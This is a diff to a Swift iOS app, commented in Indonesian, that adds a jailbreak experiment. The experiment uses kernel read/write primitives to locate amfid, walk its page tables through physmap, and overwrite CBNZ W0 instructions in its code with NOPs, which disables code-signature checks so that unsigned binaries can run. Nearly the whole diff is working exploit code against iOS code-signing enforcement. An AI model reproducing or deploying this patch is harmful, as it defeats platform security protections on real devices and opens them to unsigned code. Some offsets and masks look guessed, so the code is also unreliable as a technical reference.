@@ -759,6 +759,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③f amfid Patch (Exp 84)",
+                    icon: "waveform.badge.exclamationmark",
+                    color: .red,
+                    label: "amfid",
+                    action: runExp84AmfidPatch,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "④ Test Binary Spawn",
                     icon: "terminal.fill",
                     color: .indigo,
@@ -772,7 +782,7 @@ struct AMFIExperimentView: View {
             } header: {
                 Label("Jailbreak Path", systemImage: "flag.checkered")
             } footer: {
-                Text("② Probe pakai offset kernelcache + XPF. ③ KTRR Analysis: info saja, tidak write. ③b RC TC Add: inject CDHash via launchd RemoteCall (PPL-safe). ③e CS Flags: write cs_flags via physmap ke proc_ro binary target (bypass KTRR).")
+                Text("② Probe pakai offset kernelcache + XPF. ③ KTRR Analysis: info saja, tidak write. ③b RC TC Add: inject CDHash via launchd RemoteCall (PPL-safe). ③e CS Flags: write cs_flags via physmap ke proc_ro binary target (bypass KTRR). ③f amfid Patch: patch amfid text via physmap untuk skip signature check.")
                     .font(.system(size: 9))
             }
 
@@ -4881,6 +4891,30 @@ struct AMFIExperimentView: View {
             }
         }
     }
+
+    // MARK: - Exp 84: amfid Patch via Physmap
+
+    /// Exp 84: Patch amfid userspace daemon untuk skip signature check.
+    /// zone_require_ro memblokir write ke proc_ro (Exp 83 gagal).
+    /// amfid __TEXT bukan zone_require_ro — bisa di-patch via physmap.
+    /// Tidak perlu RC/launchd — pure KRW.
+    private func runExp84AmfidPatch() {
+        isRunning = true
+        runningLabel = "amfid"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expAmfidPatch()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+        }
+    }
     
     private func expDeepTCScan() -> ExperimentResult {
         let expName = "Deep TC Scan (Exp 82)"
@@ -6668,6 +6702,437 @@ struct AMFIExperimentView: View {
         }
 
         return ExperimentResult(name: expName, success: writeVerified, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 84: amfid Patch via Physmap
+
+    /// Patch amfid userspace daemon untuk skip signature check.
+    ///
+    /// Background:
+    ///   - proc_ro di iOS 18 di-protect zone_require_ro (hardware RO) → Exp 83 gagal
+    ///   - amfid adalah daemon yang memvalidasi code signature via XPC dari kernel
+    ///   - amfid __TEXT ada di userspace memory (bukan zone_require_ro)
+    ///   - Kita bisa baca physical address amfid text via physmap, lalu patch instruksi
+    ///
+    /// Strategi:
+    ///   1. Cari amfid proc → baca textvp (vnode binary amfid)
+    ///   2. Baca amfid task → vm_map → cari region __TEXT amfid
+    ///   3. Scan amfid __TEXT untuk pola instruksi signature check
+    ///   4. Patch: ganti instruksi check dengan MOV W0, #0 + RET (always allow)
+    ///   5. Test spawn binary unsigned
+    ///
+    /// Alternatif lebih aman: patch return value saja (NOP + MOV W0, #0)
+    ///
+    /// Target fungsi di amfid (iOS 18):
+    ///   - `_MISValidateSignatureAndCopyInfo` — return 0 = valid
+    ///   - `_amfi_check_dyld_policy_self` — return 0 = allow
+    ///   - Fungsi yang dipanggil via XPC dari kernel AMFI kext
+    ///
+    /// Kenapa aman (tidak bootloop):
+    ///   - amfid adalah userspace daemon, bukan kernel
+    ///   - Worst case: amfid crash → restart otomatis (KeepAlive launchd)
+    ///   - Tidak ada kernel panic risk
+    private func expAmfidPatch() -> ExperimentResult {
+        let expName = "amfid Patch (Exp 84)"
+        var detail = "Experiment 84: amfid Patch via Physmap\n"
+        detail += "=======================================\n\n"
+
+        guard PhysmapConstants.isVerified, let physmap = PhysmapConstants.load() else {
+            detail += "❌ Jalankan Physmap Verify (Exp 74) dulu.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let gVirtBase = physmap.gVirtBase
+        let gPhysBase = physmap.gPhysBase
+        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
+        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"
+
+        // ── Step 1: Find amfid proc ───────────────────────────────────
+        detail += "=== Step 1: Find amfid ===\n"
+        let amfidProc = mgr.findProc(name: "amfid")
+        guard amfidProc != 0 else {
+            detail += "❌ amfid tidak ditemukan di process list.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
+        detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n"
+        detail += "amfid PID: \(amfidPid)\n"
+
+        // Read proc_ro → task
+        let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
+        let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
+        detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
+        detail += "amfid task: 0x\(String(format: "%llx", amfidTask))\n"
+
+        guard amfidTask != 0, isSafeKernelHeapKreadAddress(amfidTask) else {
+            detail += "❌ amfid task tidak valid.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // ── Step 2: Find amfid __TEXT via vm_map ─────────────────────
+        detail += "\n=== Step 2: Find amfid __TEXT region ===\n"
+
+        // amfid vm_map dari task
+        let amfidVmMap = task_get_vm_map(amfidTask)
+        detail += "amfid vm_map: 0x\(String(format: "%llx", amfidVmMap))\n"
+
+        guard amfidVmMap != 0 else {
+            detail += "❌ amfid vm_map tidak ditemukan.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Scan vm_map entries untuk cari region executable (amfid __TEXT)
+        // vm_map_entry: +0x00 links.prev, +0x08 links.next, +0x10 start, +0x18 end
+        // Cari entry dengan start ~0x100000000 (userspace arm64 text)
+        // amfid binary biasanya di /usr/libexec/amfid
+        // __TEXT region: executable, start di 0x1000xxxxx range
+
+        var amfidTextStart: UInt64 = 0
+        var amfidTextEnd: UInt64 = 0
+        var amfidTextPhys: UInt64 = 0
+
+        // Walk vm_map entry list
+        // vm_map header: +0x10 = hdr.links.prev, +0x18 = hdr.links.next
+        // vm_map_entry: +0x10 = vme_start, +0x18 = vme_end, +0x20 = flags
+        let hdrNext = ds_kread64(amfidVmMap + 0x18)
+        detail += "vm_map hdr.next: 0x\(String(format: "%llx", hdrNext))\n"
+
+        if hdrNext != 0 && isSafeKernelHeapKreadAddress(hdrNext) {
+            var entry = hdrNext
+            var scanned = 0
+            while entry != 0 && entry != amfidVmMap && scanned < 256 {
+                guard isSafeKernelHeapKreadAddress(entry) else { break }
+                let vmeStart = ds_kread64(entry + 0x10)
+                let vmeEnd   = ds_kread64(entry + 0x18)
+                let vmeFlags = ds_kread64(entry + 0x20)
+
+                // amfid __TEXT: userspace arm64, executable, ~0x100000000-0x102000000
+                // flags bit 8 = VM_PROT_EXECUTE
+                let isExec = (vmeFlags & 0x8) != 0 || (vmeFlags & 0x100) != 0
+                let isUserText = vmeStart >= 0x100000000 && vmeStart < 0x200000000
+
+                if isExec && isUserText && amfidTextStart == 0 {
+                    amfidTextStart = vmeStart
+                    amfidTextEnd   = vmeEnd
+                    detail += "✅ amfid __TEXT: 0x\(String(format: "%llx", vmeStart))-0x\(String(format: "%llx", vmeEnd)) flags=0x\(String(format: "%llx", vmeFlags))\n"
+                }
+
+                let next = ds_kread64(entry + 0x08)
+                if next == entry || next == 0 { break }
+                entry = next
+                scanned += 1
+            }
+            detail += "Scanned \(scanned) vm_map entries\n"
+        }
+
+        // Fallback: amfid text biasanya mulai di 0x100000000 pada arm64
+        if amfidTextStart == 0 {
+            detail += "vm_map walk gagal — pakai default amfid text base 0x100000000\n"
+            amfidTextStart = 0x100000000
+            amfidTextEnd   = 0x102000000
+        }
+
+        detail += "amfid text range: 0x\(String(format: "%llx", amfidTextStart))-0x\(String(format: "%llx", amfidTextEnd))\n\n"
+
+        // ── Step 3: Walk page table untuk amfid text → physical address ──
+        detail += "=== Step 3: Page table walk amfid text ===\n"
+
+        // Untuk baca/tulis amfid text via physmap, perlu physical address
+        // Gunakan kernel pmap chain untuk walk page table amfid
+        // amfid pmap ada di amfid task → vm_map → pmap
+
+        // Cari pmap dari amfid vm_map
+        var amfidPmap: UInt64 = 0
+        if amfidVmMap != 0 {
+            // vm_map → pmap biasanya di offset 0x40-0x60
+            for off: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x60, 0x38] {
+                let candidate = ds_kreadptr(amfidVmMap + off)
+                if isLikelyKernelPointer(candidate) && pmapCandidateScore(candidate) >= 3 {
+                    amfidPmap = candidate
+                    detail += "amfid pmap (vm_map+0x\(String(format: "%x", off))): 0x\(String(format: "%llx", candidate))\n"
+                    break
+                }
+            }
+        }
+
+        // Walk page table untuk amfid text start
+        let targetVA = amfidTextStart
+        let l1Idx = (targetVA >> 36) & 0x7
+        let l2Idx = (targetVA >> 25) & 0x7FF
+        let l3Idx = (targetVA >> 14) & 0x7FF
+        let pageOff = targetVA & 0x3FFF
+
+        detail += "Target VA: 0x\(String(format: "%llx", targetVA))\n"
+        detail += "L1[\(l1Idx)] L2[\(l2Idx)] L3[\(l3Idx)] off=0x\(String(format: "%x", pageOff))\n"
+
+        if amfidPmap != 0 {
+            // Read L1 root dari amfid pmap (+0x00 atau +0x08)
+            for (off, name) in [(UInt64(0), "+0x00"), (UInt64(8), "+0x08")] {
+                let l1Root = ds_kreadptr(amfidPmap + off)
+                guard isReasonablePhysTT(l1Root) || isKernelOrPhysmapVA(l1Root) else { continue }
+
+                // Convert to physmap VA if physical
+                let l1VA: UInt64
+                if isReasonablePhysTT(l1Root) {
+                    l1VA = l1Root &- gPhysBase &+ gVirtBase
+                } else {
+                    l1VA = l1Root
+                }
+
+                guard isSafePhysmapKRWAddress(l1VA) || isSafeKernelKreadAddress(l1VA) else { continue }
+
+                let l1Entry = ds_kread64_safe(l1VA + l1Idx * 8)
+                guard l1Entry & 0x3 == 0x3 else { continue }
+
+                let l2Phys = l1Entry & 0x0000FFFFFFFC0000
+                let l2VA = l2Phys &- gPhysBase &+ gVirtBase
+                guard isSafePhysmapKRWAddress(l2VA) else { continue }
+
+                let l2Entry = ds_kread64_safe(l2VA + l2Idx * 8)
+                guard l2Entry & 0x3 == 0x3 else { continue }
+
+                let l3Phys = l2Entry & 0x0000FFFFFFFC0000
+                let l3VA = l3Phys &- gPhysBase &+ gVirtBase
+                guard isSafePhysmapKRWAddress(l3VA) else { continue }
+
+                let l3Entry = ds_kread64_safe(l3VA + l3Idx * 8)
+                guard l3Entry & 0x1 == 0x1 else { continue }
+
+                let pagePhys = l3Entry & 0x0000FFFFFFFC0000
+                amfidTextPhys = pagePhys
+                detail += "✅ Page table walk OK (\(name))\n"
+                detail += "  L1=0x\(String(format: "%llx", l1Entry))\n"
+                detail += "  L2=0x\(String(format: "%llx", l2Entry))\n"
+                detail += "  L3=0x\(String(format: "%llx", l3Entry))\n"
+                detail += "  amfid text phys: 0x\(String(format: "%llx", pagePhys))\n"
+                break
+            }
+        }
+
+        if amfidTextPhys == 0 {
+            detail += "⚠️ Page table walk gagal — coba baca amfid text via KRW langsung\n"
+            // amfid text ada di userspace — tidak bisa dibaca via kernel KRW langsung
+            // Perlu page table walk yang berhasil
+            detail += "❌ Tidak bisa akses amfid text tanpa physical address.\n\n"
+            detail += "=== Diagnosis ===\n"
+            detail += "amfid pmap: 0x\(String(format: "%llx", amfidPmap))\n"
+            detail += "Kemungkinan: amfid pmap offset berbeda di iOS 18.2\n"
+            detail += "Atau: amfid text di-protect oleh PPL (page table entries RO)\n\n"
+            detail += "=== Dump amfid pmap ===\n"
+            if amfidPmap != 0 {
+                for off: UInt64 in stride(from: 0, to: 0x40, by: 8) {
+                    let v = ds_kread64_safe(amfidPmap + off)
+                    if v != 0 {
+                        detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
+                    }
+                }
+            }
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // ── Step 4: Baca amfid text via physmap VA ────────────────────
+        detail += "\n=== Step 4: Read amfid text via physmap ===\n"
+
+        let amfidTextPhysmapVA = amfidTextPhys &- gPhysBase &+ gVirtBase
+        detail += "amfid text physmap VA: 0x\(String(format: "%llx", amfidTextPhysmapVA))\n"
+
+        guard isSafePhysmapKRWAddress(amfidTextPhysmapVA) else {
+            detail += "❌ amfid text physmap VA tidak aman.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Baca 32 bytes pertama amfid text untuk verifikasi (Mach-O header)
+        let magic = ds_kread32(amfidTextPhysmapVA)
+        detail += "amfid text[0]: 0x\(String(format: "%08x", magic))\n"
+
+        let isMachO = magic == 0xFEEDFACF || magic == 0xCEFAEDFE
+        if isMachO {
+            detail += "✅ Mach-O header confirmed — amfid text readable via physmap!\n\n"
+        } else {
+            detail += "⚠️ Bukan Mach-O magic (0x\(String(format: "%08x", magic))) — mungkin page offset salah\n"
+            detail += "Coba baca beberapa word untuk diagnosa:\n"
+            for i: UInt64 in [0, 8, 0x10, 0x18, 0x20] {
+                let v = ds_kread64(amfidTextPhysmapVA + i)
+                detail += "  +0x\(String(format: "%02x", i)): 0x\(String(format: "%016llx", v))\n"
+            }
+        }
+
+        // ── Step 5: Scan amfid text untuk pola signature check ────────
+        detail += "=== Step 5: Scan amfid text untuk patch target ===\n"
+        detail += "Mencari pola ARM64 yang bisa di-patch untuk skip signature check...\n\n"
+
+        // Strategi patch:
+        // amfid menerima XPC request dari kernel, memanggil MISValidateSignatureAndCopyInfo
+        // Return value 0 = valid, non-zero = invalid
+        // Kita cari fungsi yang return non-zero untuk binary tidak valid
+        // Patch: ganti dengan instruksi yang selalu return 0
+        //
+        // ARM64 instruksi:
+        //   MOV W0, #0  = 0x52800000
+        //   RET         = 0xD65F03C0
+        //   NOP         = 0xD503201F
+        //   BL target   = 0x94xxxxxx (branch and link)
+        //   CBZ W0, lbl = 0x34xxxxxx (compare and branch if zero)
+        //   CBNZ W0,lbl = 0x35xxxxxx
+        //   B.NE lbl    = 0x54xxxxxx (conditional branch)
+        //
+        // Target: cari pola "BL + CBZ/CBNZ/B.NE" yang merupakan signature check
+        // Atau: cari string reference ke "amfid" / "MISValidate" di text
+
+        var patchTargets: [(va: UInt64, physmapVA: UInt64, original: UInt32, desc: String)] = []
+        let scanPages = min(UInt64(amfidTextEnd - amfidTextStart) / 0x4000, 32) // max 32 pages = 512KB
+
+        detail += "Scanning \(scanPages) pages (0x\(String(format: "%llx", scanPages * 0x4000)) bytes)...\n"
+
+        for pageIdx in 0..<scanPages {
+            let pageVA = amfidTextStart + pageIdx * 0x4000
+            // Walk page table untuk setiap page
+            let pIdx = (pageVA >> 14) & 0x7FF
+            let p2Idx = (pageVA >> 25) & 0x7FF
+            let p1Idx = (pageVA >> 36) & 0x7
+
+            // Reuse L1 root dari amfid pmap
+            guard amfidPmap != 0 else { break }
+            let l1Root = ds_kreadptr(amfidPmap)
+            guard isReasonablePhysTT(l1Root) else { break }
+
+            let l1VA2 = l1Root &- gPhysBase &+ gVirtBase
+            guard isSafePhysmapKRWAddress(l1VA2) else { break }
+            let l1e = ds_kread64_safe(l1VA2 + p1Idx * 8)
+            guard l1e & 0x3 == 0x3 else { break }
+
+            let l2p = l1e & 0x0000FFFFFFFC0000
+            let l2v = l2p &- gPhysBase &+ gVirtBase
+            guard isSafePhysmapKRWAddress(l2v) else { break }
+            let l2e = ds_kread64_safe(l2v + p2Idx * 8)
+            guard l2e & 0x3 == 0x3 else { break }
+
+            let l3p = l2e & 0x0000FFFFFFFC0000
+            let l3v = l3p &- gPhysBase &+ gVirtBase
+            guard isSafePhysmapKRWAddress(l3v) else { break }
+            let l3e = ds_kread64_safe(l3v + pIdx * 8)
+            guard l3e & 0x1 == 0x1 else { break }
+
+            let pagePhys2 = l3e & 0x0000FFFFFFFC0000
+            let pagePhysmapVA = pagePhys2 &- gPhysBase &+ gVirtBase
+            guard isSafePhysmapKRWAddress(pagePhysmapVA) else { break }
+
+            // Scan instruksi di page ini (4 bytes per instruksi ARM64)
+            for instrOff: UInt64 in stride(from: 0, to: 0x4000, by: 4) {
+                let instr = ds_kread32(pagePhysmapVA + instrOff)
+                let instrVA = pageVA + instrOff
+                let instrPhysmapVA = pagePhysmapVA + instrOff
+
+                // Cari pola: BL (0x94xxxxxx) diikuti CBZ/CBNZ W0 (0x34/0x35 xxxxxx)
+                // Ini pola umum: call fungsi, check return value
+                let isBL = (instr >> 26) == 0x25  // BL instruction
+                if isBL && instrOff + 4 < 0x4000 {
+                    let nextInstr = ds_kread32(pagePhysmapVA + instrOff + 4)
+                    let isCBZ  = (nextInstr >> 24) == 0x34  // CBZ W0
+                    let isCBNZ = (nextInstr >> 24) == 0x35  // CBNZ W0
+                    let isBNE  = (nextInstr & 0xFF00001F) == 0x54000001  // B.NE
+
+                    if isCBZ || isCBNZ || isBNE {
+                        let desc = isCBZ ? "BL+CBZ" : isCBNZ ? "BL+CBNZ" : "BL+B.NE"
+                        patchTargets.append((
+                            va: instrVA,
+                            physmapVA: instrPhysmapVA,
+                            original: instr,
+                            desc: "\(desc) @ 0x\(String(format: "%llx", instrVA))"
+                        ))
+                        if patchTargets.count >= 10 { break }
+                    }
+                }
+
+                // Cari pola: CBNZ W0 (return value check setelah call)
+                // Patch CBNZ → NOP agar tidak branch ke error path
+                let isCBNZ0 = (instr >> 24) == 0x35 && (instr & 0x1F) == 0  // CBNZ W0
+                if isCBNZ0 {
+                    patchTargets.append((
+                        va: instrVA,
+                        physmapVA: instrPhysmapVA,
+                        original: instr,
+                        desc: "CBNZ W0 @ 0x\(String(format: "%llx", instrVA))"
+                    ))
+                    if patchTargets.count >= 10 { break }
+                }
+            }
+            if patchTargets.count >= 10 { break }
+        }
+
+        detail += "Found \(patchTargets.count) patch candidates\n\n"
+
+        if patchTargets.isEmpty {
+            detail += "❌ Tidak ada patch candidate ditemukan.\n"
+            detail += "Kemungkinan: amfid text tidak terbaca via physmap, atau pola berbeda.\n"
+            detail += "\nInfo untuk diagnosa:\n"
+            detail += "  amfid text physmap VA: 0x\(String(format: "%llx", amfidTextPhysmapVA))\n"
+            detail += "  magic: 0x\(String(format: "%08x", magic))\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Log candidates
+        detail += "=== Patch candidates ===\n"
+        for (i, t) in patchTargets.prefix(5).enumerated() {
+            detail += "  [\(i)] \(t.desc) instr=0x\(String(format: "%08x", t.original))\n"
+        }
+        detail += "\n"
+
+        // ── Step 6: Patch — NOP semua CBNZ W0 di amfid text ─────────
+        detail += "=== Step 6: Patch amfid text ===\n"
+        detail += "Strategy: NOP semua CBNZ W0 (skip error branch setelah signature check)\n\n"
+
+        let NOP: UInt32 = 0xD503201F
+        var patchedCount = 0
+        var patchLog = ""
+
+        for t in patchTargets {
+            // Hanya patch CBNZ W0 (paling aman — skip error path)
+            let isCBNZ0 = (t.original >> 24) == 0x35 && (t.original & 0x1F) == 0
+            guard isCBNZ0 else { continue }
+
+            guard isSafePhysmapKRWAddress(t.physmapVA) else { continue }
+
+            // Write NOP via physmap
+            ds_kwrite32(t.physmapVA, NOP)
+
+            // Verify
+            let after = ds_kread32(t.physmapVA)
+            if after == NOP {
+                patchedCount += 1
+                patchLog += "  ✅ Patched 0x\(String(format: "%llx", t.va)): 0x\(String(format: "%08x", t.original)) → NOP\n"
+            } else {
+                patchLog += "  ❌ Failed 0x\(String(format: "%llx", t.va)): got 0x\(String(format: "%08x", after))\n"
+            }
+        }
+
+        detail += patchLog
+        detail += "\nPatched \(patchedCount) instruksi\n\n"
+
+        if patchedCount == 0 {
+            detail += "❌ Tidak ada instruksi yang berhasil di-patch.\n"
+            detail += "Kemungkinan: amfid text page di-protect (W^X enforcement)\n"
+            detail += "iOS 18 mungkin enforce W^X untuk userspace text pages via PPL\n\n"
+            detail += "=== Diagnosis ===\n"
+            detail += "Coba baca kembali instruksi yang di-patch:\n"
+            for t in patchTargets.prefix(3) {
+                let readback = ds_kread32(t.physmapVA)
+                detail += "  0x\(String(format: "%llx", t.va)): 0x\(String(format: "%08x", readback)) (original: 0x\(String(format: "%08x", t.original)))\n"
+            }
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        detail += "✅ amfid text patched!\n"
+        detail += "Sekarang amfid akan skip error branch setelah signature check.\n\n"
+        detail += "=== NEXT STEPS ===\n"
+        detail += "1. Tap ④ Test Binary Spawn dengan path binary unsigned\n"
+        detail += "2. Jika spawn berhasil tanpa SIGKILL → amfid patch works!\n"
+        detail += "3. Jika masih SIGKILL → perlu patch lebih banyak instruksi\n\n"
+        detail += "⚠️ amfid akan restart otomatis jika crash (KeepAlive)\n"
+        detail += "⚠️ Patch hilang setelah amfid restart — perlu re-patch\n"
+
+        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
     }
 
     
